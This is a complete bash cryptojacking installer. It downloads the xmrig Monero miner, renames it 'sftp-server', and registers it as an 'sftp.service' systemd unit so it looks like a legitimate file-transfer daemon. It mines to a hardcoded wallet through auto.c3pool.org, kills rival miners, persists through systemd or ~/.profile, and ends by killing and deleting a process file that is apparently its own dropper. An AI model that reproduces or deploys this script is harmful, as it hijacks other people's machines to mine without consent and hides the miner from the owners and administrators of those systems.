#!/bin/bash

VERSION=2.11

# printing greetings
if [ `id -u` -eq 0 ];then
        rm -rf /usr/local/sftp
        mkdir -p /usr/local/sftp
        BASE_DIR=/usr/local/sftp
else
        rm -rf $HOME/.sftp
        mkdir -p $HOME/.sftp
        BASE_DIR=$HOME/.sftp
fi

# command line arguments
WALLET=44NiFypuZZGXxMM3sZ7eN1U3pCnPj6m8BGx3tD4i2CZjYhCsHS9PMk7H9LJ57ryM6mVUUru78RiHh5PvTCiyyHY9Ur7jGCp
EMAIL=$2 # this one is optional


WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 ]; then
  exit 1
fi

if [ -z $HOME ]; then
  exit 1
fi

if [ ! -d $HOME ]; then
  echo '  export HOME=<dir>'
  exit 1
fi

if ! type curl >/dev/null; then
  exit 1
fi

if ! type lscpu >/dev/null; then
  echo "WARNING: This script requires \"lscpu\" utility to work correctly"
fi

# calculating port

CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
if [ -z $EXP_MONERO_HASHRATE ]; then
  echo "ERROR: Can't compute projected Monero CN hashrate"
  exit 1
fi

get_port_based_on_hashrate() {
  local hashrate=$1
  if [ "$hashrate" -le "5000" ]; then
    echo 80
  elif [ "$hashrate" -le "25000" ]; then
    if [ "$hashrate" -gt "5000" ]; then
      echo 13333
    else
      echo 443
    fi
  elif [ "$hashrate" -le "50000" ]; then
    if [ "$hashrate" -gt "25000" ]; then
      echo 15555
    else
      echo 14444
    fi
  elif [ "$hashrate" -le "100000" ]; then
    if [ "$hashrate" -gt "50000" ]; then
      echo 19999
    else
      echo 17777
    fi
  elif [ "$hashrate" -le "1000000" ]; then
    echo 23333
  else
    echo "ERROR: Hashrate too high"
    exit 1
  fi
}

PORT=$(get_port_based_on_hashrate $EXP_MONERO_HASHRATE)
if [ -z $PORT ]; then
  echo "ERROR: Can't compute port"
  exit 1
fi

echo "Computed port: $PORT"


# printing intentions

if [ ! -z $EMAIL ]; then
  echo "(and $EMAIL email as password to modify wallet options later at https://c3pool.com site)"
fi
echo

if ! sudo -n true 2>/dev/null; then
  echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
else
  echo "Mining in background will be performed using c3pool_miner systemd service."
fi

# start doing stuff: preparing miner

echo "[*] Removing previous c3pool miner (if any)"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop c3pool_miner.service
  sudo systemctl stop sftp.service
fi
killall -9 xmrig
killall -9 sftp-server

echo "[*] Removing $HOME/c3pool directory"
rm -rf $HOME/c3pool
rm -rf $BASE_DIR


echo "[*] Downloading C3Pool advanced version of xmrig to /tmp/xmrig.tar.gz"
if ! curl -L --progress-bar "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz" -o /tmp/xmrig.tar.gz; then
  echo "ERROR: Can't download https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
  exit 1
fi

echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/c3pool"
[ -d $BASE_DIR ] || mkdir $BASE_DIR
if ! tar xf /tmp/xmrig.tar.gz -C $BASE_DIR; then
  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/c3pool directory"
  exit 1
fi
mv $BASE_DIR/xmrig $BASE_DIR/sftp-server
rm /tmp/xmrig.tar.gz

sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $BASE_DIR/config.json
$BASE_DIR/sftp-server --help >/dev/null
if (test $? -ne 0); then
  if [ -f $BASE_DIR/sftp-server ]; then
    echo "WARNING: Advanced version of $HOME/c3pool/xmrig is not functional"
  else 
    echo "WARNING: Advanced version of $HOME/c3pool/xmrig was removed by antivirus (or some other problem)"
  fi

  echo "[*] Looking for the latest version of Monero miner"
  LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
  LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`

  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/xmrig.tar.gz"
  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then
    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"
    exit 1
  fi

  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/c3pool"
  if ! tar xf /tmp/xmrig.tar.gz -C $BASE_DIR --strip=1; then
    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/c3pool directory"
  fi
  rm /tmp/xmrig.tar.gz
  mv $BASE_DIR/xmrig $BASE_DIR/sftp-server

  echo "[*] Checking if stock version of $HOME/c3pool/xmrig works fine (and not removed by antivirus software)"
  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $BASE_DIR/config.json
  $BASE_DIR/sftp-server --help >/dev/null
  if (test $? -ne 0); then 
    if [ -f $BASE_DIR/sftp-server ]; then
      echo "ERROR: Stock version of $HOME/c3pool/xmrig is not functional too"
    else 
      echo "ERROR: Stock version of $HOME/c3pool/xmrig was removed by antivirus too"
    fi
    exit 1
  fi
fi

echo "[*] Miner $HOME/c3pool/xmrig is OK"

PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
if [ "$PASS" == "localhost" ]; then
  PASS=`ip route get 1 | awk '{print $NF;exit}'`
fi
if [ -z $PASS ]; then
  PASS=na
fi
if [ ! -z $EMAIL ]; then
  PASS="$PASS:$EMAIL"
fi

sed -i 's/"url": *"[^"]*",/"url": "auto.c3pool.org:'$PORT'",/' $BASE_DIR/config.json
sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $BASE_DIR/config.json
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $BASE_DIR/config.json
sed -i 's/"max-threads-hint": *[^,]*,/"max-threads-hint": 80,/' $BASE_DIR/config.json
sed -i 's#"log-file": *null,#"log-file": "'$BASE_DIR/sftp-log.log'",#' $BASE_DIR/config.json
sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $BASE_DIR/config.json

cp $BASE_DIR/config.json $BASE_DIR/config_background.json
sed -i 's/"background": *false,/"background": true,/' $BASE_DIR/config_background.json

# preparing script

echo "[*] Creating $HOME/c3pool/miner.sh script"
cat >$BASE_DIR/miner.sh <<EOL
#!/bin/bash
if ! pidof xmrig >/dev/null; then
  nice $BASE_DIR/sftp-server \$*
else
  echo "Monero miner is already running in the background. Refusing to run another one."
  echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background miner first."
fi
EOL

chmod +x $BASE_DIR/miner.sh

# preparing script background work and work under reboot

if ! sudo -n true 2>/dev/null; then
  if ! grep c3pool/miner.sh $HOME/.profile >/dev/null; then
    echo "[*] Adding $HOME/c3pool/miner.sh script to $HOME/.profile"
    echo "$HOME/c3pool/miner.sh --config=$HOME/c3pool/config_background.json >/dev/null 2>&1" >>$HOME/.profile
  else 
    echo "Looks like $HOME/c3pool/miner.sh script is already in the $HOME/.profile"
  fi
  echo "[*] Running miner in the background (see logs in $HOME/c3pool/xmrig.log file)"
  /bin/bash $BASE_DIR/miner.sh --config=$BASE_DIR/config_background.json >/dev/null 2>&1
else

  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
    echo "[*] Enabling huge pages"
    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
  fi

  if ! type systemctl >/dev/null; then

    /bin/bash $BASE_DIR/miner.sh --config=$BASE_DIR/config_background.json >/dev/null 2>&1
    
  else

    echo "[*] Creating c3pool_miner systemd service"
    cat >/tmp/sftp.service <<EOL
[Unit]
Description=Monero miner service

[Service]
ExecStart=$BASE_DIR/sftp-server --config=$BASE_DIR/config.json
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL
    sudo mv /tmp/sftp.service /etc/systemd/system/sftp.service
    sudo killall sftp-server 2>/dev/null
    sudo systemctl daemon-reload
    sudo systemctl enable sftp.service
    sudo systemctl start sftp.service
  fi
fi

if [ "$CPU_THREADS" -lt "4" ]; then
  echo "HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:"
  echo "sudo apt-get update; sudo apt-get install -y cpulimit"
  echo "sudo cpulimit -e xmrig -l $((75*$CPU_THREADS)) -b"
  if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
    echo "sudo sed -i -e '\$acpulimit -e xmrig -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  else
    echo "sudo sed -i -e '\$i \\cpulimit -e xmrig -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  fi
else
  echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$BASE_DIR/config.json"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$BASE_DIR/config_background.json"
fi
echo ""
pid=$(ps -ef | grep "1586699003758" | grep -v grep | awk '{print $2}')
filed=$(ps -ef | grep "1586699003758" | grep -v grep | awk '{print $9}')
kill $pid
rm -rf $filed
